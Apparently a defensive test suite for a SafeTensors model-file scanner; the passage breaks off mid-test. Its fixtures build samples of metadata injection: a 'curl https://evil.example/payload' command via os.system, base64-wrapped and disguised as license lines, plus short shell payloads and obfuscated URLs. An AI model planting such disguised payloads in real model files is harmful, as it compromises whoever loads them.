import base64
import builtins
import json
import os
import struct
import zipfile
from pathlib import Path
from types import TracebackType
from typing import Any, BinaryIO
from urllib.parse import quote

import numpy as np
import pytest

# Skip if safetensors is not available before importing it
pytest.importorskip("safetensors")

from safetensors import SafetensorError, safe_open
from safetensors.numpy import load_file, save_file

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanners.base import DEFAULT_MAX_FILE_READ_SIZE, INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.safetensors_scanner import (
    _BASE64_LICENSE_WRAP_MIN_FRAGMENT_RATIO,
    SAFETENSORS_READ_INCONCLUSIVE_REASON,
    SafeTensorsScanner,
)

CYRILLIC_SMALL_A = chr(0x0430)
FULLWIDTH_PERCENT = chr(0xFF05)


def create_safetensors_file(path: Path) -> None:
    data: dict[str, np.ndarray] = {
        "t1": np.arange(10, dtype=np.float32),
        "t2": np.ones((2, 2), dtype=np.int64),
    }
    save_file(data, str(path))


def create_safetensors_with_dtype_size_mismatch(path: Path, dtype: str) -> None:
    write_raw_safetensors(
        path,
        {"tensor": {"dtype": dtype, "shape": [4], "data_offsets": [0, 1]}},
        b"\x00",
    )


def write_raw_safetensors(path: Path, header: dict[str, Any], data: bytes) -> None:
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    path.write_bytes(struct.pack("<Q", len(header_bytes)) + header_bytes + data)


def write_raw_safetensors_header(path: Path, header_bytes: bytes, data: bytes = b"") -> None:
    path.write_bytes(struct.pack("<Q", len(header_bytes)) + header_bytes + data)


def write_sparse_safetensors(path: Path, header: dict[str, Any], data_size: int) -> None:
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    with path.open("wb") as handle:
        handle.write(struct.pack("<Q", len(header_bytes)))
        handle.write(header_bytes)
        handle.truncate(8 + len(header_bytes) + data_size)


def ordinary_license_text_with_url() -> str:
    body = """
Apache License
Version 2.0, January 2004
http://www.apache.org/licenses/

TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

1. Definitions.

"License" shall mean the terms and conditions for use, reproduction, and
distribution as defined by Sections 1 through 9 of this document.

2. Grant of License. Subject to the terms and conditions of this License, each
Contributor hereby grants You a perpetual, worldwide, non-exclusive, no-charge,
royalty-free, irrevocable copyright license to reproduce, prepare Derivative
Works of, publicly display, publicly perform, sublicense, and distribute the Work.

Source reference: https://github.com/Lightricks/LTX-Video
Additional licensing: https://ltx.io/model/licensing
"""
    return body + ("\nThis paragraph is ordinary license text and contains no executable metadata." * 10)


def ordinary_license_text_without_url() -> str:
    return "\n".join(
        [
            "MIT License",
            "Permission is hereby granted to use, reproduce, distribute, sublicense, and modify the work.",
            "The copyright notice and permission notice shall be included with copies of the work.",
            "License terms grant permission to reproduce and distribute derivative works under applicable law.",
            "Patent license terms grant use of the work and related output under these conditions.",
            "Liability restriction terms apply to every entity that receives the licensed work.",
            "Trademark restrictions and copyright notices must remain with the distributed work.",
            "This license agreement grants permission to use the work under ordinary terms.",
            "The licensor may grant additional permission to reproduce and distribute the work.",
        ]
    )


def long_ordinary_license_text_with_incidental_tokens(line_count: int = 160) -> str:
    lines = [
        "MIT License",
        "Permission is hereby granted to use, reproduce, distribute, sublicense, and modify the work.",
    ]
    lines.extend(
        f"License grant rights valid claims under terms for use and distribution section {index}."
        for index in range(line_count)
    )
    return "\n".join(lines)


def encode_url_path(path: str, passes: int) -> str:
    encoded = path
    for _ in range(passes):
        encoded = quote(encoded, safe="")
    return encoded


def standard_wrapped_base64_tail(line_count: int) -> str:
    return "\n".join("QUJD" * 19 for _ in range(line_count))


def executable_wrapped_base64_lines(widths: tuple[int, ...] = (76,)) -> list[str]:
    payload = ("import os\nos.system('curl https://evil.example/payload')\n" * 8).encode("utf-8")
    encoded = base64.b64encode(payload).decode("ascii")
    lines: list[str] = []
    cursor = 0
    width_index = 0
    while cursor < len(encoded):
        width = widths[width_index % len(widths)]
        lines.append(encoded[cursor : cursor + width])
        cursor += width
        width_index += 1
    return lines


def padded_executable_wrapped_base64_lines(chunk_size: int = 2) -> list[str]:
    payload = ("import os\nos.system('curl https://evil.example/payload')\n" * 8).encode("utf-8")
    return [
        base64.b64encode(payload[index : index + chunk_size]).decode("ascii")
        for index in range(0, len(payload), chunk_size)
    ]


def short_executable_base64_tail() -> str:
    return base64.b64encode(b"import os\nos.system('id')\n").decode("ascii")


def short_import_gadget_base64_tail() -> str:
    return base64.b64encode(b"__import__('os').system('id')").decode("ascii")


def short_shell_payload_base64_tail() -> str:
    return base64.b64encode(b"rm -rf /tmp/model\nchmod +x /tmp/runner\n").decode("ascii")


def comment_separated_executable_wrapped_base64_tail() -> str:
    return "\n# continued\n".join(executable_wrapped_base64_lines())


def confusable_payload_url() -> str:
    return f"https://github.com/Lightricks/LTX-2/blob/main/p{CYRILLIC_SMALL_A}yload/license"


def fullwidth_percent_release_url() -> str:
    return (
        f"https://github.com/Lightricks/LTX-2/{FULLWIDTH_PERCENT}252freleases"
        f"{FULLWIDTH_PERCENT}252fdownload{FULLWIDTH_PERCENT}252fv1/license"
    )


def encoded_fullwidth_percent_release_url() -> str:
    escaped_percent = quote(FULLWIDTH_PERCENT, safe="")
    return (
        f"https://github.com/Lightricks/LTX-2/{escaped_percent}252freleases"
        f"{escaped_percent}252fdownload{escaped_percent}252fv1/license"
    )


def test_valid_safetensors_file(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is True
    assert not result.has_errors
    assert result.metadata.get("tensor_count") == 2
    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "passed"


@pytest.mark.parametrize(
    ("dtype", "shape", "data_size"),
    [
        ("C64", [2], 16),
        ("F4", [2], 1),
        ("F6_E2M3", [4], 3),
        ("F6_E3M2", [4], 3),
        ("F8_E4M3FNUZ", [4], 4),
        ("F8_E5M2FNUZ", [4], 4),
        ("F8_E8M0", [4], 4),
    ],
)
def test_valid_current_safetensors_dtype(
    tmp_path: Path,
    dtype: str,
    shape: list[int],
    data_size: int,
) -> None:
    file_path = tmp_path / f"valid-{dtype}.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {
                "dtype": dtype,
                "shape": shape,
                "data_offsets": [0, data_size],
            },
        },
        b"\x00" * data_size,
    )

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.scanner_name == "safetensors"
    assert direct.success is True
    assert direct.issues == []
    assert any(
        check.name == "Tensor Size Consistency Check"
        and check.status == CheckStatus.PASSED
        and check.details.get("size") == data_size
        for check in direct.checks
    )
    assert determine_exit_code(aggregate) == 0


def test_valid_empty_tensor_offsets(tmp_path: Path) -> None:
    file_path = tmp_path / "empty_tensor.safetensors"
    save_file(
        {
            "empty": np.empty((0,), dtype=np.float32),
            "value": np.ones((1,), dtype=np.float32),
        },
        str(file_path),
    )

    with file_path.open("rb") as handle:
        header_len = struct.unpack("<Q", handle.read(8))[0]
        header = json.loads(handle.read(header_len))

    assert header["empty"]["data_offsets"][0] == header["empty"]["data_offsets"][1]
    assert load_file(str(file_path))["empty"].shape == (0,)

    result = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert result.success is True
    assert not result.has_errors
    assert any(
        check.name == "Tensor Offset Validation"
        and check.details.get("tensor") == "empty"
        and check.status == CheckStatus.PASSED
        for check in result.checks
    )
    assert any(
        check.name == "Tensor Size Consistency Check"
        and check.details.get("tensor") == "empty"
        and check.details.get("size") == 0
        and check.status == CheckStatus.PASSED
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


def test_zero_length_offsets_require_empty_shape(tmp_path: Path) -> None:
    file_path = tmp_path / "invalid_zero_length_tensor.safetensors"
    write_raw_safetensors(
        file_path,
        {"not_empty": {"dtype": "F32", "shape": [1], "data_offsets": [0, 0]}},
        b"",
    )

    result = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert result.success is False
    assert any(
        check.name == "Tensor Size Consistency Check"
        and check.details.get("tensor") == "not_empty"
        and check.details.get("expected_size") == 4
        and check.details.get("actual_size") == 0
        and check.severity == IssueSeverity.CRITICAL
        and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_empty_tensor_offset_sort_matches_safetensors(tmp_path: Path) -> None:
    file_path = tmp_path / "empty_tensor_before_nonempty_range.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "nonempty": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "empty": {"dtype": "U8", "shape": [0], "data_offsets": [0, 0]},
        },
        b"\x00",
    )

    with safe_open(str(file_path), framework="np") as handle:
        assert set(handle.keys()) == {"empty", "nonempty"}

    result = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(
        check.status == CheckStatus.FAILED and check.name == "Offset Continuity Check" for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    ("dtype", "shape"),
    [
        ("U8", [1 << (8 * struct.calcsize("P") - 1), 2, 0]),
        ("U16", [1 << (8 * struct.calcsize("P") - 1)]),
        ("U8", [1 << (8 * struct.calcsize("P")), 0]),
    ],
)
def test_shape_size_overflow_cannot_be_masked_by_zero_dimension(
    tmp_path: Path,
    dtype: str,
    shape: list[int],
) -> None:
    file_path = tmp_path / "overflow_masked_empty_tensor.safetensors"
    write_raw_safetensors(
        file_path,
        {"tensor": {"dtype": dtype, "shape": shape, "data_offsets": [0, 0]}},
        b"",
    )

    with pytest.raises(SafetensorError, match=r"(?i)(overflow|invalid.*(?:header|json))"):
        safe_open(str(file_path), framework="np")

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(
        check.name == "Tensor Size Computation Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("shape") == shape
        for check in result.checks
    )


def test_zero_before_large_dimensions_remains_valid_empty_shape(tmp_path: Path) -> None:
    file_path = tmp_path / "zero_first_large_empty_tensor.safetensors"
    shape = [0, 1 << (8 * struct.calcsize("P") - 1), 2]
    write_raw_safetensors(
        file_path,
        {
            "tensor": {
                "dtype": "U8",
                "shape": shape,
                "data_offsets": [0, 0],
            }
        },
        b"",
    )

    with safe_open(str(file_path), framework="np") as handle:
        assert handle.get_slice("tensor").get_shape() == shape

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME


def test_tensor_size_overflow_uses_native_byte_width(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner._MAX_PLATFORM_USIZE", 15)

    assert SafeTensorsScanner._expected_size("U8", [15]) == 15
    assert SafeTensorsScanner._expected_size("U8", [16]) is None
    assert SafeTensorsScanner._expected_size("U16", [7]) == 14
    assert SafeTensorsScanner._expected_size("U16", [8]) is None


def test_offsets_must_fit_native_usize(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    file_path = tmp_path / "native_offset_overflow.safetensors"
    write_raw_safetensors(
        file_path,
        {"empty": {"dtype": "U8", "shape": [0], "data_offsets": [4, 4]}},
        b"\x00" * 4,
    )
    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner._MAX_PLATFORM_USIZE", 3)

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert any(
        check.name == "Tensor Offset Validation"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        and check.details.get("max_platform_offset") == 3
        for check in result.checks
    )


def test_valid_empty_safetensors_custom_metadata(tmp_path: Path) -> None:
    """An empty string-to-string map is valid custom metadata."""
    file_path = tmp_path / "empty_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata["custom_metadata_valid"] is True
    assert result.metadata["custom_metadata_entry_count"] == 0
    assert result.metadata["custom_metadata_security_flags"] == []
    assert any(
        check.name == "SafeTensors Metadata Structure Validation" and check.status == CheckStatus.PASSED
        for check in result.checks
    )


def test_license_metadata_document_url_and_length_are_not_suspicious(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata.safetensors"
    license_text = ordinary_license_text_with_url()
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": license_text},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))
    summary = SafeTensorsScanner._summarize_custom_metadata({"license": license_text})

    assert len(license_text) > 1000
    assert result.success is True
    assert result.metadata["custom_metadata_valid"] is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert summary["custom_metadata_security_flags"] == []
    assert not [
        check
        for check in result.checks
        if check.name in {"Metadata Length Check", "Metadata Pattern Check"} and check.status == CheckStatus.FAILED
    ]
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_ordinary_prose_without_url_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata_without_url.safetensors"
    license_text = ordinary_license_text_without_url()
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": license_text},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))
    summary = SafeTensorsScanner._summarize_custom_metadata({"license": license_text})

    assert 500 <= len(license_text) < 1000
    assert "http://" not in license_text
    assert "https://" not in license_text
    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", license_text, metadata_is_valid=True)
    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert summary["custom_metadata_security_flags"] == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_long_ordinary_document_with_incidental_tokens_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "long_license_metadata_without_url.safetensors"
    license_text = long_ordinary_license_text_with_incidental_tokens()
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": license_text},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))
    summary = SafeTensorsScanner._summarize_custom_metadata({"license": license_text})
    failed_metadata_checks = [
        check
        for check in result.checks
        if check.name in {"Metadata Length Check", "Metadata Pattern Check"} and check.status == CheckStatus.FAILED
    ]

    assert len(license_text) > 1000
    assert len(license_text.splitlines()) > 128
    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", license_text, metadata_is_valid=True)
    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert summary["custom_metadata_security_flags"] == []
    assert failed_metadata_checks == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_dmca_trusted_url_prose_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata_dmca_trusted_url.safetensors"
    legal_lines = [
        "License grant DMCA reference https://opensource.org/licenses/MIT",
        "License grant DMCA SPDX reference https://spdx.org/licenses/MIT.json",
        "License terms grant permission use reproduce distribute work.",
        "License agreement terms grant permission reproduce work.",
        "Copyright license terms use reproduce distribute work.",
        "Patent license terms grant use reproduce work.",
        "Liability license terms permission use work.",
        "Permission license terms reproduce distribute derivative work.",
    ]
    license_text = f"{ordinary_license_text_with_url()}\n" + "\n".join(legal_lines)
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": license_text},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))
    summary = SafeTensorsScanner._summarize_custom_metadata({"license": license_text})
    failed_metadata_checks = [
        check
        for check in result.checks
        if check.name in {"Metadata Length Check", "Metadata Pattern Check"} and check.status == CheckStatus.FAILED
    ]
    flags = set(result.metadata["custom_metadata_security_flags"])

    assert len(license_text) > 1000
    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert result.success is True
    assert result.metadata["custom_metadata_valid"] is True
    assert "suspicious_pattern" not in flags
    assert "unusually_long_value" not in flags
    assert result.metadata["custom_metadata_security_flags"] == []
    assert summary["custom_metadata_security_flags"] == []
    assert failed_metadata_checks == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_document_reconstructs_standard_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    payload = f"{license_text}\n{standard_wrapped_base64_tail(line_count=3)}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_comment_separated_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    payload = f"{license_text}\n{comment_separated_executable_wrapped_base64_tail()}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_short_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    tail = "\n".join(executable_wrapped_base64_lines((31,)))
    payload = f"{license_text}\n{tail}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_narrow_annotated_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    tail = "\n".join(f"License grant continuation {line}" for line in executable_wrapped_base64_lines((15,)))
    payload = f"{license_text}\n{tail}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_quantum_annotated_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    tail = "\n".join(f"License grant {line}" for line in executable_wrapped_base64_lines((4,)))
    payload = f"{license_text}\n{tail}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_infix_annotated_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    tail = "\n".join(f"License grant {line} under terms" for line in executable_wrapped_base64_lines((4,)))
    payload = f"{license_text}\n{tail}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_padded_wrapped_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    tail = "\n".join(f"License grant {line}" for line in padded_executable_wrapped_base64_lines())
    payload = f"{license_text}\n{tail}"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_short_active_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    payload = f"{license_text}\nLicense grant {short_executable_base64_tail()} under terms"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_short_import_gadget_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    payload = f"{license_text}\nLicense grant {short_import_gadget_base64_tail()} under terms"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_reconstructs_shell_payload_base64_tail() -> None:
    license_text = ordinary_license_text_with_url()
    payload = f"{license_text}\nLicense grant {short_shell_payload_base64_tail()} under terms"

    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)


def test_license_document_rejects_encoded_url_tail() -> None:
    license_text = ordinary_license_text_with_url()
    payload = f"{license_text}\nEncoded reference: https%3A%2F%2Fevil.example%2Fx"
    mixed_payload = f"{license_text}\nEncoded reference: https%3A//evil.example/x"
    partially_encoded_payload = f"{license_text}\nEncoded reference: h%74tps%3A%2F%2Fevil.example/x"

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", license_text, metadata_is_valid=True)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", mixed_payload, metadata_is_valid=True)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value(
        "license", partially_encoded_payload, metadata_is_valid=True
    )


def test_license_url_residual_encoding_fails_closed() -> None:
    encoded_prefix = encode_url_path("/releases/download/v1", passes=5)

    assert SafeTensorsScanner._url_looks_like_license_reference("https://github.com/Lightricks/LTX-2/blob/main/LICENSE")
    assert SafeTensorsScanner._url_looks_like_license_reference("https://opensource.org/licenses/MIT")
    assert SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com:443/Lightricks/LTX-2/blob/main/LICENSE"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        f"https://github.com/Lightricks/LTX-2/{encoded_prefix}/license"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://user:pass@github.com/Lightricks/LTX-2/blob/main/LICENSE"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com/Lightricks/LTX-2/blob/main/%70%61%79%6c%6f%61%64/license"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(confusable_payload_url())
    assert not SafeTensorsScanner._url_looks_like_license_reference(fullwidth_percent_release_url())
    assert not SafeTensorsScanner._url_looks_like_license_reference(encoded_fullwidth_percent_release_url())
    assert not SafeTensorsScanner._url_looks_like_license_reference("https://github.com/Lightricks/LTX-2;payload")
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com/Lightricks/LTX-2/blob/main/license.py%00.txt"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com/Lightricks/LTX-2/blob/main/license.bat"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com/Lightricks/LTX-2/blob/main/license.com"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com/Lightricks/LTX-2/blob/main/license.pkl"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com/Lightricks/LTX-2/%5Creleases%5Cdownload%5Cv1/license"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://opensource.org/licenses/MIT,https://evil.example/x"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://opensource.org/licenses/MIT,https%3A%2F%2Fevil.example%2Fx"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com:bad/Lightricks/LTX-2/blob/main/LICENSE"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference("https://opensource.org:bad/licenses/MIT")
    assert not SafeTensorsScanner._url_looks_like_license_reference(
        "https://github.com:/Lightricks/LTX-2/blob/main/LICENSE"
    )
    assert not SafeTensorsScanner._url_looks_like_license_reference("https://opensource.org:/licenses/MIT")


def test_license_metadata_executable_content_is_not_suppressed(tmp_path: Path) -> None:
    file_path = tmp_path / "malicious_license_metadata.safetensors"
    payload = ordinary_license_text_with_url() + "\nimport os\nos.system('curl https://evil.example/payload')"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert set(result.metadata["custom_metadata_security_flags"]) >= {
        "code_injection",
        "code_like_value",
        "suspicious_pattern",
        "unusually_long_value",
    }
    assert any(
        check.name == "SafeTensors Code Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/payload",
        "https://evil.example/license",
        "https://github.com/Lightricks/LTX-Video/releases/download/v1/license.txt",
        "https://github.com/Lightricks/LTX-2/blob/main/license_update.py",
        "https://github.com/Lightricks/LTX-2/blob/main/license.bat",
        "https://github.com/Lightricks/LTX-2/blob/main/license.com",
        "https://github.com/Lightricks/LTX-2/blob/main/license.jar",
        "https://github.com/Lightricks/LTX-2/blob/main/license.js",
        "https://github.com/Lightricks/LTX-2/%252Freleases%252Fv1/license",
        "https://user:pass@github.com/Lightricks/LTX-2/blob/main/LICENSE",
        "https://github.com/Lightricks/LTX-2/blob/main/%70%61%79%6c%6f%61%64/license",
        "https://github.com/Lightricks/LTX-2/blob/main/%63%61%6c%6c%62%61%63%6b/license",
        "https://github.com/Lightricks/LTX-2/blob/main/%65%78%66%69%6c/license",
        confusable_payload_url(),
        fullwidth_percent_release_url(),
        encoded_fullwidth_percent_release_url(),
        "https://github.com/Lightricks/LTX-2;payload",
        "https://github.com/Lightricks/LTX-2/blob/main/license.py%00.txt",
        "https://github.com/Lightricks/LTX-2/%5Creleases%5Cdownload%5Cv1/license",
        "https://opensource.org/licenses/MIT,https://evil.example/x",
        "https%3A%2F%2Fevil.example%2Fx",
        "https%3A//evil.example/x",
        "h%74tps%3A%2F%2Fevil.example/x",
        "https://github.com/Lightricks/LTX-2/blob/main/license.pkl",
        "https://opensource.org/licenses/MIT?u=https://evil.example/x",
        "https://github.com:bad/Lightricks/LTX-2/blob/main/LICENSE",
        "https://github.com:65536/Lightricks/LTX-2/blob/main/LICENSE",
        "https://opensource.org:bad/licenses/MIT",
        "https://github.com:/Lightricks/LTX-2/blob/main/LICENSE",
        "https://opensource.org:/licenses/MIT",
        "https://[",
    ],
)
def test_license_metadata_untrusted_url_is_not_suppressed(tmp_path: Path, url: str) -> None:
    file_path = tmp_path / "license_metadata_untrusted_url.safetensors"
    payload = ordinary_license_text_with_url() + f"\nAdditional terms: {url}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "suspicious_pattern" in result.metadata["custom_metadata_security_flags"]
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )
    assert not any(
        check.name == "SafeTensors File Scan" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "url",
    [
        "https://opensource.org/licenses/MIT",
        "https://spdx.org/licenses/MIT.json",
        "https://github.com/Lightricks/LTX-2/blob/main/LICENSE",
    ],
)
def test_license_metadata_short_trusted_url_is_not_suspicious(tmp_path: Path, url: str) -> None:
    file_path = tmp_path / "license_metadata_short_trusted_url.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": url},
        },
        b"\x00",
    )

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    assert direct.metadata["custom_metadata_security_flags"] == []
    assert not [
        check
        for check in direct.checks
        if check.name == "Metadata Pattern Check" and check.status == CheckStatus.FAILED
    ]
    assert not [issue for issue in direct.issues if issue.rule_code == "S905"]
    assert not [issue for issue in aggregate.issues if issue.rule_code == "S905"]


@pytest.mark.parametrize(
    ("key", "url"),
    [
        ("homepage", "HTTPS://evil.example/payload"),
        ("license", "hTTpS://evil.example/payload"),
    ],
)
def test_metadata_raw_mixed_case_url_reports_s905(tmp_path: Path, key: str, url: str) -> None:
    file_path = tmp_path / "metadata_mixed_case_url.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {key: url},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" and key in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": key, "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "url",
    [
        "HTTPS://opensource.org/licenses/MIT",
        "hTTpS://github.com/Lightricks/LTX-2/blob/main/LICENSE",
    ],
)
def test_license_metadata_mixed_case_trusted_url_is_not_suspicious(tmp_path: Path, url: str) -> None:
    file_path = tmp_path / "license_metadata_mixed_case_trusted_url.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": url},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [
        check
        for check in result.checks
        if check.name == "Metadata Pattern Check" and check.status == CheckStatus.FAILED
    ]
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_short_trusted_url_is_not_suspicious_in_nested_archive(tmp_path: Path) -> None:
    source_file = tmp_path / "nested.safetensors"
    archive_path = tmp_path / "bundle.zip"
